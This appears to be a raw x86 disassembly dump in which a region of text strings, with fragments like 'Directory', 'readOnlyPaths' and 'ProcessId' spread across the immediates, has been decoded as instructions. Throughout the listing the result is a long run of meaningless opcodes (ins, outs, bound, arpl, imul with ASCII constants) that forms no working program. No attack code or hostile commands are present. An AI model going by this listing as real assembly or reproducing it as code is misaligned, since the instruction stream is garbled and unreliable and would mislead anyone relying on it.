  409948:	imul   ebp,DWORD PTR [ebp+eiz*2+0x0],0x65746144
  409950:	push   esp
  409951:	imul   ebp,DWORD PTR [ebp+0x65],0x74654700
  409958:	inc    esi
  409959:	imul   ebp,DWORD PTR [ebp+eiz*2+0x54],0x73656d69
  409961:	je     0x4099c4
  409963:	ins    DWORD PTR es:[edi],dx
  409964:	jo     0x409966
  409966:	inc    esi
  409967:	imul   ebp,DWORD PTR [ebp+eiz*2+0x45],0x74736978
  40996f:	jae    0x409971
  409971:	inc    esp
  409972:	imul   esi,DWORD PTR [edx+0x65],0x726f7463
  409979:	jns    0x4099c0
  40997b:	js     0x4099e6
  40997d:	jae    0x4099f3
  40997f:	jae    0x409981
  409981:	inc    edi
  409982:	gs je  0x4099cb
  409985:	imul   ebp,DWORD PTR [ebp+eiz*2+0x0],0x44746547
  40998d:	imul   esi,DWORD PTR [edx+0x65],0x726f7463
  409994:	jns    0x409996
  409996:	inc    ebx
  409997:	outs   dx,DWORD PTR ds:[esi]
  409998:	ins    DWORD PTR es:[edi],dx
  409999:	bound  ebp,QWORD PTR [ecx+0x6e]
  40999c:	gs push esi
  40999e:	imul   esi,DWORD PTR [edx+0x74],0x506c6175
  4099a5:	popa   
  4099a6:	je     0x409a10
  4099a8:	jae    0x4099aa
  4099aa:	pop    edi
  4099ab:	jbe    0x409a16
  4099ad:	jb     0x409a23
  4099af:	jne    0x409a12
  4099b1:	ins    BYTE PTR es:[edi],dx
  4099b2:	push   eax
  4099b3:	popa   
  4099b4:	je     0x409a1e
  4099b6:	dec    ecx
  4099b7:	je     0x409a1e
  4099b9:	ins    DWORD PTR es:[edi],dx
  4099ba:	dec    ecx
  4099bb:	outs   dx,BYTE PTR ds:[esi]
  4099bc:	outs   dx,WORD PTR ds:[esi]
  4099be:	add    BYTE PTR [edi+0x65],ah
  4099c1:	je     0x409a22
  4099c3:	dec    esi
  4099c4:	popa   
  4099c5:	ins    DWORD PTR es:[edi],dx
  4099c6:	add    BYTE PTR gs:[ebx+0x79],dl
  4099ca:	jae    0x409a40
  4099cc:	gs ins DWORD PTR es:[edi],dx
  4099ce:	cs dec ecx
  4099d0:	dec    edi
  4099d1:	add    BYTE PTR [ebx+0x74],dl
  4099d4:	jb     0x409a3b
  4099d6:	popa   
  4099d7:	ins    DWORD PTR es:[edi],dx
  4099d8:	add    BYTE PTR [edi+0x70],cl
  4099db:	outs   dx,BYTE PTR gs:[esi]
  4099dd:	add    BYTE PTR [esi+0x61],cl
  4099e0:	ins    DWORD PTR es:[edi],dx
  4099e1:	add    BYTE PTR gs:[ecx+0x45],cl
  4099e5:	outs   dx,BYTE PTR ds:[esi]
  4099e6:	jne    0x409a55
  4099e8:	gs jb  0x409a4c
  4099eb:	bound  ebp,QWORD PTR [ebp+eiz*2+0x0]
  4099ef:	addr16 gs je 0x409a52
  4099f3:	inc    esp
  4099f4:	imul   esi,DWORD PTR [edx+0x65],0x726f7463
  4099fb:	imul   esp,DWORD PTR [ebp+0x73],0x74656700
  409a02:	pop    edi
  409a03:	inc    esi
  409a04:	imul   ebp,DWORD PTR [ebp+eiz*2+0x73],0x74656700
  409a0c:	pop    edi
  409a0d:	inc    ebx
  409a0e:	push   0x72646c69
  409a13:	outs   dx,BYTE PTR gs:[esi]
  409a15:	add    BYTE PTR [ecx+ebp*2+0x72],al
  409a19:	arpl   WORD PTR gs:[edi+ebp*2+0x72],si
  409a1e:	imul   esp,DWORD PTR [ebp+0x73],0x6c694600
  409a25:	gs jae 0x409a28
  409a28:	inc    ebx
  409a29:	push   0x72646c69
  409a2e:	outs   dx,BYTE PTR gs:[esi]
  409a30:	add    BYTE PTR [esi+0x61],dh
  409a33:	ins    BYTE PTR es:[edi],dx
  409a34:	jne    0x409a9b
  409a36:	add    BYTE PTR [ecx+0x72],ah
  409a39:	addr16 jae 0x409a3c
  409a3c:	bound  esp,QWORD PTR [ecx+0x73]
  409a3f:	gs push ebp
  409a41:	jb     0x409aac
  409a43:	add    BYTE PTR [ecx+0x75],ah
  409a46:	je     0x409ab0
  409a48:	outs   dx,DWORD PTR ds:[esi]
  409a49:	jb     0x409ab4
  409a4b:	jp     0x409aae
  409a4d:	je     0x409ab8
  409a4f:	outs   dx,DWORD PTR ds:[esi]
  409a50:	outs   dx,BYTE PTR ds:[esi]
  409a51:	dec    ebp
  409a52:	popa   
  409a53:	outs   dx,BYTE PTR ds:[esi]
  409a54:	popa   
  409a55:	addr16 gs jb 0x409a59
  409a59:	bound  ebp,QWORD PTR [ecx+0x6e]
  409a5c:	imul   ebp,DWORD PTR fs:[esi+0x67],0x6f727000
  409a64:	arpl   WORD PTR [ebp+0x73],sp
  409a67:	jae    0x409aae
  409a69:	js     0x409ad4
  409a6b:	je     0x409ab2
  409a6d:	jbe    0x409ad4
  409a6f:	outs   dx,BYTE PTR ds:[esi]
  409a70:	je     0x409a72
  409a72:	imul   ebp,DWORD PTR [esi+0x73],0x636e6174
  409a79:	gs inc ebx
  409a7b:	outs   dx,DWORD PTR ds:[esi]
  409a7c:	outs   dx,BYTE PTR ds:[esi]
  409a7d:	je     0x409ae4
  409a7f:	js     0x409af5
  409a81:	add    BYTE PTR [ebp+0x65],ch
  409a84:	jae    0x409af9
  409a86:	popa   
  409a87:	add    BYTE PTR gs:[bx+di+0x6e],ch
  409a8c:	jae    0x409b02
  409a8e:	popa   
  409a8f:	outs   dx,BYTE PTR ds:[esi]
  409a90:	arpl   WORD PTR [ebp+0x0],sp
  409a93:	outs   dx,BYTE PTR gs:[esi]
  409a95:	fs jo  0x409b07
  409a98:	imul   ebp,DWORD PTR [esi+0x74],0x6e696200
  409a9f:	imul   ebp,DWORD PTR fs:[esi+0x67],0x61726150
  409aa7:	ins    DWORD PTR es:[edi],dx
  409aa8:	gs je  0x409b10
  409aab:	jb     0x409b20
  409aad:	add    BYTE PTR [ebx+0x6c],ah
  409ab0:	imul   esp,DWORD PTR [ebp+0x6e],0x6e755274
  409ab7:	je     0x409b22
  409ab9:	ins    DWORD PTR es:[edi],dx
  409aba:	add    BYTE PTR gs:[ebp+0x6e],ah
  409abe:	fs jo  0x409b30
  409ac1:	imul   ebp,DWORD PTR [esi+0x74],0x70736944
  409ac8:	popa   
  409ac9:	je     0x409b2e
  409acb:	push   0x72007265
  409ad0:	gs jno 0x409b48
  409ad3:	gs jae 0x409b4a
  409ad6:	add    BYTE PTR [ebx+0x68],ah
  409ad9:	popa   
  409ada:	outs   dx,BYTE PTR ds:[esi]
  409adb:	outs   dx,BYTE PTR ds:[esi]
  409adc:	gs ins BYTE PTR es:[edi],dx
  409ade:	add    BYTE PTR [edx+0x65],dh
  409ae1:	jo     0x409b4f
  409ae3:	jns    0x409ae5
  409ae5:	arpl   WORD PTR [edi+0x72],bp
  409ae8:	jb     0x409b4f
  409aea:	ins    BYTE PTR es:[edi],dx
  409aeb:	popa   
  409aec:	je     0x409b57
  409aee:	outs   dx,DWORD PTR ds:[esi]
  409aef:	outs   dx,BYTE PTR ds:[esi]
  409af0:	push   ebx
  409af1:	je     0x409b54
  409af3:	je     0x409b5a
  409af5:	add    BYTE PTR [ebx+0x69],dh
  409af8:	add    BYTE PTR fs:[ebx+0x6c],ah
  409afc:	imul   esp,DWORD PTR [ebp+0x6e],0x644974
  409b03:	outs   dx,DWORD PTR ds:[esi]
  409b04:	jo     0x409b6b
  409b06:	jb     0x409b69
  409b08:	je     0x409b73
  409b0a:	outs   dx,DWORD PTR ds:[esi]
  409b0b:	outs   dx,BYTE PTR ds:[esi]
  409b0c:	inc    ebx
  409b0d:	outs   dx,DWORD PTR ds:[esi]
  409b0e:	outs   dx,BYTE PTR ds:[esi]
  409b0f:	je     0x409b76
  409b11:	js     0x409b87
  409b13:	add    BYTE PTR [ebx+0x62],ah
  409b16:	ins    DWORD PTR es:[edi],dx
  409b17:	push   ebx
  409b18:	gs jb  0x409b91
  409b1b:	imul   esp,DWORD PTR [ebx+0x65],0x6c6c6143
  409b22:	bound  esp,QWORD PTR [ecx+0x63]
  409b25:	imul   eax,DWORD PTR [eax],0x65
  409b28:	jb     0x409b9c
  409b2a:	outs   dx,DWORD PTR ds:[esi]
  409b2b:	jb     0x409b2d
  409b2d:	add    BYTE PTR gs:[esi+0x69],dh
  409b31:	jb     0x409ba7
  409b33:	jne    0x409b96
  409b35:	ins    BYTE PTR es:[edi],dx
  409b36:	push   eax
  409b37:	popa   
  409b38:	je     0x409ba2
  409b3a:	add    BYTE PTR [ecx+eiz*2+0x72],dh
  409b3e:	addr16 gs je 0x409b88
  409b42:	jb     0x409ba5
  409b44:	ins    DWORD PTR es:[edi],dx
  409b45:	gs ja  0x409bb7
  409b48:	jb     0x409bb5
  409b4a:	dec    ebp
  409b4b:	outs   dx,DWORD PTR ds:[esi]
  409b4c:	outs   dx,BYTE PTR ds:[esi]
  409b4d:	imul   ebp,DWORD PTR [ebx+0x65],0x61740072
  409b54:	jb     0x409bbd
  409b56:	gs je  0x409b9f
  409b59:	jb     0x409bbc
  409b5b:	ins    DWORD PTR es:[edi],dx
  409b5c:	gs ja  0x409bce
  409b5f:	jb     0x409bcc
  409b61:	push   eax
  409b62:	popa   
  409b63:	je     0x409bcd
  409b65:	jae    0x409b67
  409b67:	je     0x409bca
  409b69:	jb     0x409bd2
  409b6b:	gs je  0x409bb4
  409b6e:	jb     0x409bd1
  409b70:	ins    DWORD PTR es:[edi],dx
  409b71:	gs ja  0x409be3
  409b74:	jb     0x409be1
  409b76:	push   eax
  409b77:	popa   
  409b78:	je     0x409be2
  409b7a:	add    BYTE PTR [ebp+0x78],ah
  409b7d:	arpl   WORD PTR [ebp+esi*2+0x73],bp
  409b81:	imul   ebp,DWORD PTR [edi+0x6e],0x7473694c
  409b88:	add    BYTE PTR [edx+0x65],dh
  409b8b:	data16 gs jb 0x409bf4
  409b8f:	outs   dx,BYTE PTR ds:[esi]
  409b90:	arpl   WORD PTR [ebp+0x41],sp
  409b93:	jae    0x409c08
  409b95:	gs ins DWORD PTR es:[edi],dx
  409b97:	bound  ebp,QWORD PTR [ecx+edi*2+0x50]
  409b9b:	popa   
  409b9c:	je     0x409c06
  409b9e:	add    BYTE PTR [ebx+0x68],ah
  409ba1:	arpl   WORD PTR gs:[ebx+0x46],bp
  409ba5:	outs   dx,DWORD PTR ds:[esi]
  409ba6:	jb     0x409bed
  409ba8:	js     0x409c13
  409baa:	jae    0x409c20
  409bac:	outs   dx,BYTE PTR gs:[esi]
  409bae:	arpl   WORD PTR [ebp+0x0],sp
  409bb1:	ins    BYTE PTR es:[edi],dx
  409bb2:	gs popa 
  409bb4:	jae    0x409c1b
  409bb6:	add    BYTE PTR [edx+0x69],ah
  409bb9:	outs   dx,BYTE PTR ds:[esi]
  409bba:	inc    esi
  409bbb:	outs   dx,DWORD PTR ds:[esi]
  409bbc:	ins    BYTE PTR es:[edi],dx
  409bbd:	fs gs jb 0x409c11
  409bc1:	popa   
  409bc2:	je     0x409c2c
  409bc4:	add    BYTE PTR [ebx+0x6f],ah
  409bc7:	fs gs inc edi
  409bca:	outs   dx,BYTE PTR gs:[esi]
  409bcc:	inc    esp
  409bcd:	imul   esi,DWORD PTR [edx+0x0],0x73697865
  409bd4:	je     0x409c3f
  409bd6:	outs   dx,BYTE PTR ds:[esi]
  409bd7:	addr16 push eax
  409bd9:	jb     0x409c4a
  409bdb:	jbe    0x409c46
  409bdd:	fs gs jb 0x409be1
  409be1:	jae    0x409c48
  409be3:	jb     0x409c5b
  409be5:	imul   esp,DWORD PTR [ebx+0x65],0x65707954
  409bec:	add    BYTE PTR [edx+0x75],dh
  409bef:	outs   dx,BYTE PTR ds:[esi]
  409bf0:	je     0x409c5b
  409bf2:	ins    DWORD PTR es:[edi],dx
  409bf3:	gs dec edi
  409bf5:	jb     0x409c4b
  409bf7:	popa   
  409bf8:	jb     0x409c61
  409bfa:	gs je  0x409c3e
  409bfd:	jae    0x409c72
  409bff:	gs ins DWORD PTR es:[edi],dx
  409c01:	bound  ebp,QWORD PTR [ecx+edi*2+0x4e]
  409c05:	popa   
  409c06:	ins    DWORD PTR es:[edi],dx
  409c07:	add    BYTE PTR gs:[ebx+0x75],dh
  409c0b:	addr16 addr16 gs jae 0x409c84
  409c10:	gs fs inc ecx
  409c13:	jae    0x409c88
  409c15:	gs ins DWORD PTR es:[edi],dx
  409c17:	bound  ebp,QWORD PTR [ecx+edi*2+0x50]
  409c1b:	popa   
  409c1c:	je     0x409c86
  409c1e:	add    BYTE PTR [ecx+eiz*2+0x72],dh
  409c22:	addr16 gs je 0x409c6c
  409c26:	jb     0x409c89
  409c28:	ins    DWORD PTR es:[edi],dx
  409c29:	gs ja  0x409c9b
  409c2c:	jb     0x409c99
  409c2e:	add    BYTE PTR [ecx+eiz*2+0x72],dh
  409c32:	addr16 gs je 0x409c77
  409c36:	jae    0x409cab
  409c38:	gs ins DWORD PTR es:[edi],dx
  409c3a:	bound  ebp,QWORD PTR [ecx+edi*2+0x4e]
  409c3e:	popa   
  409c3f:	ins    DWORD PTR es:[edi],dx
  409c40:	add    BYTE PTR gs:[eax+0x70],dh
  409c44:	push   esp
  409c45:	popa   
  409c46:	jb     0x409caf
  409c48:	gs je  0x409c91
  409c4b:	jb     0x409cae
  409c4d:	ins    DWORD PTR es:[edi],dx
  409c4e:	gs ja  0x409cc0
  409c51:	jb     0x409cbe
  409c53:	add    BYTE PTR [ebx+0x79],dl
  409c56:	jae    0x409ccc
  409c58:	gs ins DWORD PTR es:[edi],dx
  409c5a:	cs push edx
  409c5c:	jne    0x409ccc
  409c5e:	je     0x409cc9
  409c60:	ins    DWORD PTR es:[edi],dx
  409c61:	gs cs dec ecx
  409c64:	outs   dx,BYTE PTR ds:[esi]
  409c65:	je     0x409ccc
  409c67:	jb     0x409cd8
  409c69:	jo     0x409cbe
  409c6b:	gs jb  0x409ce4
  409c6e:	imul   esp,DWORD PTR [ebx+0x65],0x754f0073
  409c75:	je     0x409cb8
  409c77:	je     0x409ced
  409c79:	jb     0x409ce4
  409c7b:	bound  esi,QWORD PTR [ebp+0x74]
  409c7e:	add    BYTE PTR gs:[eax+0x72],dh
  409c82:	addr16 inc ecx
  409c84:	jae    0x409cf9
  409c86:	gs ins DWORD PTR es:[edi],dx
  409c88:	bound  ebp,QWORD PTR [ecx+edi*2+0x53]
  409c8c:	jo     0x409cf3
  409c8e:	arpl   WORD PTR [ebx+0x0],si
  409c91:	arpl   WORD PTR [ecx+0x73],ax
  409c94:	jae    0x409cfb
  409c96:	ins    DWORD PTR es:[edi],dx
  409c97:	bound  ebp,QWORD PTR [ecx+ebp*2+0x65]
  409c9b:	jae    0x409cf1
  409c9d:	outs   dx,DWORD PTR ds:[esi]
  409c9e:	push   edx
  409c9f:	gs jae 0x409d11
  409ca2:	ins    BYTE PTR es:[edi],dx
  409ca3:	jbe    0x409d0a
  409ca5:	add    BYTE PTR [eax+0x72],dh
  409ca8:	addr16 push edx
  409caa:	gs jae 0x409d1c
  409cad:	ins    BYTE PTR es:[edi],dx
  409cae:	jbe    0x409d15
  409cb0:	fs inc ecx
  409cb2:	jae    0x409d27
  409cb4:	gs ins DWORD PTR es:[edi],dx
  409cb6:	bound  ebp,QWORD PTR [ecx+edi*2+0x50]
  409cba:	popa   
  409cbb:	je     0x409d25
  409cbd:	jae    0x409cbf
  409cbf:	jo     0x409d24
  409cc1:	push   edx
  409cc2:	gs jae 0x409d34
  409cc5:	ins    BYTE PTR es:[edi],dx
  409cc6:	jbe    0x409d2d
  409cc8:	fs inc ecx
  409cca:	jae    0x409d3f
  409ccc:	gs ins DWORD PTR es:[edi],dx
  409cce:	bound  ebp,QWORD PTR [ecx+edi*2+0x50]
  409cd2:	popa   
  409cd3:	je     0x409d3d
  409cd5:	jae    0x409cd7
  409cd7:	imul   esp,DWORD PTR [edi+0x6e],0x5665726f
  409cde:	gs jb  0x409d54
  409ce1:	imul   ebp,DWORD PTR [edi+0x6e],0x46726f46
  409ce8:	jb     0x409d4b
  409cea:	ins    DWORD PTR es:[edi],dx
  409ceb:	gs ja  0x409d5d
  409cee:	jb     0x409d5b
  409cf0:	push   edx
  409cf1:	gs data16 gs jb 0x409d5b
  409cf6:	outs   dx,BYTE PTR ds:[esi]
  409cf7:	arpl   WORD PTR [ebp+0x73],sp
  409cfa:	add    BYTE PTR [ecx+0x73],ah
  409cfd:	jae    0x409d64
  409cff:	ins    DWORD PTR es:[edi],dx
  409d00:	bound  ebp,QWORD PTR [ecx+edi*2+0x53]
  409d04:	jo     0x409d6b
  409d06:	arpl   WORD PTR [eax],ax
  409d08:	imul   bp,WORD PTR [ebp+eiz*2+0x6e],0x6d61
  409d0f:	add    BYTE PTR gs:[edx+0x65],dh
  409d13:	push   sp
  409d15:	jns    0x409d87
  409d17:	add    BYTE PTR gs:[eax+0x73],dh
  409d1b:	jp     0x409d71
  409d1d:	inc    esi
  409d1e:	dec    ebp
  409d1f:	add    BYTE PTR [eax+0x73],dh
  409d22:	jp     0x409d65
  409d24:	jae    0x409d99
  409d26:	gs ins DWORD PTR es:[edi],dx
  409d28:	bound  ebp,QWORD PTR [ecx+edi*2+0x53]
  409d2c:	jo     0x409d93
  409d2e:	arpl   WORD PTR [eax],ax
  409d30:	jo     0x409d94
  409d32:	dec    ecx
  409d33:	jae    0x409d7e
  409d35:	outs   dx,BYTE PTR ds:[esi]
  409d36:	inc    esi
  409d37:	jb     0x409d9a
  409d39:	ins    DWORD PTR es:[edi],dx
  409d3a:	gs ja  0x409dac
  409d3d:	jb     0x409daa
  409d3f:	add    BYTE PTR [eax+0x62],dh
  409d42:	jae    0x409db8
  409d44:	jb     0x409d98
  409d46:	gs jae 0x409db8
  409d49:	ins    BYTE PTR es:[edi],dx
  409d4a:	jbe    0x409db1
  409d4c:	fs inc esi
  409d4e:	jne    0x409dbc
  409d50:	ins    BYTE PTR es:[edi],dx
  409d51:	push   eax
  409d52:	popa   
  409d53:	je     0x409dbd
  409d55:	add    BYTE PTR [eax+0x62],dh
  409d58:	jae    0x409dce
  409d5a:	jb     0x409d9e
  409d5c:	imul   ebp,DWORD PTR [esi+0x46],0x65646c6f
  409d63:	jb     0x409db5
  409d65:	popa   
  409d66:	je     0x409dd0
  409d68:	add    BYTE PTR [edx+0x65],dh
  409d6b:	data16 jae 0x409d6e
  409d6e:	imul   ebp,DWORD PTR [ebp+0x6d],0x61696465
  409d75:	je     0x409ddc
  409d77:	add    BYTE PTR [ecx+0x73],ah
  409d7a:	jae    0x409de1
  409d7c:	ins    DWORD PTR es:[edi],dx
  409d7d:	bound  ebp,QWORD PTR [ecx+edi*2+0x54]
  409d81:	popa   
  409d82:	bound  ebp,QWORD PTR [ebp+eiz*2+0x49]
  409d86:	outs   dx,BYTE PTR ds:[esi]
  409d87:	outs   dx,WORD PTR ds:[esi]
  409d89:	jae    0x409d8b
  409d8b:	popa   
  409d8c:	jae    0x409e01
  409d8e:	gs ins DWORD PTR es:[edi],dx
  409d90:	bound  ebp,QWORD PTR [ecx+edi*2+0x4e]
  409d94:	popa   
  409d95:	ins    DWORD PTR es:[edi],dx
  409d96:	add    BYTE PTR gs:[esi+0x65],dh
  409d9a:	jb     0x409e0f
  409d9c:	imul   ebp,DWORD PTR [edi+0x6e],0x73736100
  409da3:	gs ins DWORD PTR es:[edi],dx
  409da5:	bound  ebp,QWORD PTR [ecx+edi*2+0x54]
  409da9:	popa   
  409daa:	bound  ebp,QWORD PTR [ebp+eiz*2+0x73]
  409dae:	add    BYTE PTR [ecx+0x73],ah
  409db1:	jae    0x409e18
  409db3:	ins    DWORD PTR es:[edi],dx
  409db4:	bound  ebp,QWORD PTR [ecx+edi*2+0x54]
  409db8:	popa   
  409db9:	bound  ebp,QWORD PTR [ebp+eiz*2+0x49]
  409dbd:	outs   dx,BYTE PTR ds:[esi]
  409dbe:	outs   dx,WORD PTR ds:[esi]
  409dc0:	add    BYTE PTR [ecx+0x0],ah
  409dc3:	bound  eax,QWORD PTR [eax]
  409dc5:	outs   dx,DWORD PTR ds:[esi]
  409dc6:	bound  ebp,QWORD PTR [edx+0x0]
  409dc9:	outs   dx,BYTE PTR ds:[esi]
  409dca:	popa   
  409dcb:	ins    DWORD PTR es:[edi],dx
  409dcc:	add    BYTE PTR gs:[eax+0x75],dh
  409dd0:	bound  ebp,QWORD PTR [ecx+ebp*2+0x63]
  409dd4:	dec    ebx
  409dd5:	gs jns 0x409e2c
  409dd8:	outs   dx,DWORD PTR ds:[esi]
  409dd9:	imul   esp,DWORD PTR [ebp+0x6e],0x0
  409ddd:	arpl   WORD PTR [ebp+0x6c],si
  409de0:	je     0x409e57
  409de2:	jb     0x409e49
  409de4:	add    BYTE PTR [ecx+0x73],ch
  409de7:	inc    esp
  409de8:	imul   esi,DWORD PTR [ebx+0x70],0x6e69736f
  409def:	add    BYTE PTR [bx+si+0x68],dh
  409df3:	jns    0x409e68
  409df5:	imul   esp,DWORD PTR [ebx+0x61],0x7461506c
  409dfc:	push   0x74656d00
  409e01:	popa   
  409e02:	bound  esp,QWORD PTR [ecx+0x73]
  409e05:	gs push eax
  409e07:	popa   
  409e08:	je     0x409e72
  409e0a:	add    BYTE PTR [ebp+eiz*2+0x73],ah
  409e0e:	je     0x409e79
  409e10:	outs   dx,BYTE PTR ds:[esi]
  409e11:	popa   
  409e12:	je     0x409e7d
  409e14:	outs   dx,DWORD PTR ds:[esi]
  409e15:	outs   dx,BYTE PTR ds:[esi]
  409e16:	push   eax
  409e17:	popa   
  409e18:	je     0x409e82
  409e1a:	add    BYTE PTR [ebx+0x65],ch
  409e1d:	jns    0x409e85
  409e1f:	imul   ebp,DWORD PTR [ebp+eiz*2+0x0],0x4379656b
  409e27:	outs   dx,DWORD PTR ds:[esi]
  409e28:	outs   dx,BYTE PTR ds:[esi]
  409e29:	je     0x409e8c
  409e2b:	imul   ebp,DWORD PTR [esi+0x65],0x72700072
  409e32:	arpl   WORD PTR gs:[edi+0x6d],bp
  409e36:	jo     0x409ea1
  409e38:	ins    BYTE PTR es:[edi],dx
  409e39:	popa   
  409e3a:	je     0x409ea5
  409e3c:	outs   dx,DWORD PTR ds:[esi]
  409e3d:	outs   dx,BYTE PTR ds:[esi]
  409e3e:	inc    esi
  409e3f:	ins    BYTE PTR es:[edi],dx
  409e40:	popa   
  409e41:	addr16 jae 0x409e44
  409e44:	jne    0x409eb9
  409e46:	gs push esi
  409e48:	imul   esi,DWORD PTR [edx+0x74],0x506c6175
  409e4f:	popa   
  409e50:	je     0x409eba
  409e52:	push   eax
  409e53:	jb     0x409ec4
  409e55:	jbe    0x409ec0
  409e57:	fs gs jb 0x409e5b
  409e5b:	arpl   WORD PTR [edi+0x64],bp
  409e5e:	gs inc esp
  409e60:	dec    edi
  409e61:	dec    ebp
  409e62:	push   eax
  409e63:	jb     0x409ed4
  409e65:	jbe    0x409ed0
  409e67:	fs gs jb 0x409eb9
  409e6b:	popa   
  409e6c:	ins    DWORD PTR es:[edi],dx
  409e6d:	add    BYTE PTR gs:[ebx+0x6f],ah
  409e71:	ins    DWORD PTR es:[edi],dx
  409e72:	jo     0x409edd
  409e74:	ins    BYTE PTR es:[edi],dx
  409e75:	gs jb  0x409ec8
  409e78:	popa   
  409e79:	jb     0x409edc
  409e7b:	ins    DWORD PTR es:[edi],dx
  409e7c:	jae    0x409e7e
  409e7e:	outs   dx,BYTE PTR gs:[si]
  409e81:	gs jb  0x409ee5
  409e84:	je     0x409eeb
  409e86:	fs inc esi
  409e88:	imul   ebp,DWORD PTR [ebp+eiz*2+0x73],0x726944
  409e90:	outs   dx,BYTE PTR gs:[si]
  409e93:	gs jb  0x409ef7
  409e96:	je     0x409f01
  409e98:	outs   dx,BYTE PTR ds:[esi]
  409e99:	addr16 inc esi
  409e9b:	imul   ebp,DWORD PTR [ebp+eiz*2+0x73],0x6e656700
  409ea3:	gs jb  0x409f07
  409ea6:	je     0x409f0d
  409ea8:	fs inc esi
  409eaa:	imul   ebp,DWORD PTR [ebp+eiz*2+0x73],0x72697600
  409eb2:	je     0x409f29
  409eb4:	popa   
  409eb5:	ins    BYTE PTR es:[edi],dx
  409eb6:	inc    esi
  409eb7:	imul   ebp,DWORD PTR [ebp+eiz*2+0x43],0x65746e6f
  409ebf:	outs   dx,BYTE PTR ds:[esi]
  409ec0:	je     0x409f35
  409ec2:	add    BYTE PTR [ebx+0x6f],ah
  409ec5:	fs add BYTE PTR gs:[ecx+ebp*2+0x6e],ch
  409ecb:	gs push eax
  409ecd:	jb     0x409f30
  409ecf:	ins    DWORD PTR es:[di],dx
  409ed1:	popa   
  409ed2:	jae    0x409ed4
  409ed4:	popa   
  409ed5:	jae    0x409f4a
  409ed7:	gs ins DWORD PTR es:[edi],dx
  409ed9:	bound  ebp,QWORD PTR [ecx+edi*2+0x50]
  409edd:	popa   
  409ede:	je     0x409f48
  409ee0:	add    BYTE PTR [edi+0x65],ah
  409ee3:	outs   dx,BYTE PTR ds:[esi]
  409ee4:	gs jb  0x409f48
  409ee7:	je     0x409f4e
  409ee9:	fs inc esi
  409eeb:	imul   ebp,DWORD PTR [ebp+eiz*2+0x0],0x656e6567
  409ef3:	jb     0x409f56
  409ef5:	je     0x409f5c
  409ef7:	fs inc esi
  409ef9:	imul   ebp,DWORD PTR [ebp+eiz*2+0x50],0x687461
  409f01:	bound  esi,QWORD PTR [edx+0x6f]
  409f04:	ja     0x409f79
  409f06:	gs jb  0x409f4d
  409f09:	gs data16 jae 0x409f0d
  409f0d:	ja     0x409f7e
  409f0f:	jb     0x409f7c
  409f11:	dec    ecx
  409f12:	je     0x409f79
  409f14:	ins    DWORD PTR es:[edi],dx
  409f15:	push   esp
  409f16:	jns    0x409f88
  409f18:	outs   dx,BYTE PTR gs:[esi]
  409f1a:	popa   
  409f1b:	ins    DWORD PTR es:[edi],dx
  409f1c:	add    BYTE PTR gs:[ebx+0x74],ah
  409f20:	outs   dx,DWORD PTR ds:[esi]
  409f21:	jb     0x409f73
  409f23:	popa   
  409f24:	jb     0x409f87
  409f26:	ins    DWORD PTR es:[edi],dx
  409f27:	jae    0x409f29
  409f29:	push   eax
  409f2a:	popa   
  409f2b:	jb     0x409f8e
  409f2d:	ins    DWORD PTR es:[edi],dx
  409f2e:	inc    ecx
  409f2f:	jb     0x409fa3
  409f31:	popa   
  409f32:	jns    0x409f75
  409f34:	je     0x409faa
  409f36:	jb     0x409fa1
  409f38:	bound  esi,QWORD PTR [ebp+0x74]
  409f3b:	add    BYTE PTR gs:[edi+0x6f],dh
  409f3f:	jb     0x409fac
  409f41:	dec    ecx
  409f42:	je     0x409fa9
  409f44:	ins    DWORD PTR es:[edi],dx
  409f45:	push   esp
  409f46:	jns    0x409fb8
  409f48:	add    BYTE PTR gs:[esi+0x6f],ah
  409f4c:	jb     0x409fb1
  409f4e:	gs inc ebx
  409f50:	ins    BYTE PTR es:[edi],dx
  409f51:	gs popa 
  409f53:	outs   dx,BYTE PTR ds:[esi]
  409f54:	inc    edx
  409f55:	jne    0x409fc0
  409f57:	ins    BYTE PTR es:[edi],dx
  409f58:	add    BYTE PTR fs:[ecx+0x73],ch
  409f5c:	inc    esi
  409f5d:	imul   ebp,DWORD PTR [ebp+eiz*2+0x0],0x72756f73
  409f65:	arpl   WORD PTR [ebp+0x0],sp
  409f68:	arpl   WORD PTR [edx+0x6d],sp
  409f6b:	inc    ebx
  409f6c:	popa   
  409f6d:	ins    BYTE PTR es:[edi],dx
  409f6e:	ins    BYTE PTR es:[edi],dx
  409f6f:	bound  esp,QWORD PTR [ecx+0x63]
  409f72:	imul   eax,DWORD PTR [eax],0x72
  409f75:	gs popa 
  409f77:	jae    0x409fe8
  409f79:	outs   dx,BYTE PTR ds:[esi]
  409f7a:	add    BYTE PTR [ecx+ebp*2+0x6e],ch
  409f7e:	add    BYTE PTR gs:[ebx+0x6f],ah
  409f82:	ins    BYTE PTR es:[edi],dx
  409f83:	jne    0x409ff2
  409f85:	outs   dx,BYTE PTR ds:[esi]
  409f86:	add    BYTE PTR [ebp+0x72],ah
  409f89:	jb     0x409ffa
  409f8b:	jb     0x409fdb
  409f8d:	jne    0x409ffc
  409f8f:	bound  esp,QWORD PTR [ebp+0x72]
  409f92:	add    BYTE PTR [ecx+0x73],ch
  409f95:	inc    ebp
  409f96:	jb     0x40a00a
  409f98:	outs   dx,DWORD PTR ds:[esi]
  409f99:	jb     0x409fe9
  409f9b:	outs   dx,DWORD PTR ds:[esi]
  409f9c:	je     0x409ff5
  409f9e:	popa   
  409f9f:	jb     0x40a00f
  409fa1:	imul   ebp,DWORD PTR [esi+0x67],0x72726500
  409fa8:	outs   dx,DWORD PTR ds:[esi]
  409fa9:	jb     0x409fff
  409fab:	gs js  0x40a022
  409fae:	add    BYTE PTR [ebp+0x72],ah
  409fb1:	jb     0x40a007
  409fb3:	jns    0x40a025
  409fb5:	add    BYTE PTR gs:[ecx+0x74],ch
  409fb9:	gs ins DWORD PTR es:[edi],dx
  409fbb:	push   esp
  409fbc:	jns    0x40a02e
  409fbe:	add    BYTE PTR gs:[ebx+0x61],ah
  409fc2:	ins    BYTE PTR es:[edi],dx
  409fc3:	ins    BYTE PTR es:[edi],dx
  409fc4:	inc    edx
  409fc5:	popa   
  409fc6:	arpl   WORD PTR [ebx+0x46],bp
  409fc9:	jne    0x40a039
  409fcb:	arpl   WORD PTR [ecx+ebp*2+0x6f],si
  409fcf:	outs   dx,BYTE PTR ds:[esi]
  409fd0:	add    BYTE PTR [ebx+0x61],ah
  409fd3:	ins    BYTE PTR es:[edi],dx
  409fd4:	ins    BYTE PTR es:[edi],dx
  409fd5:	bound  esp,QWORD PTR [ecx+0x63]
  409fd8:	imul   eax,DWORD PTR [eax],0x73
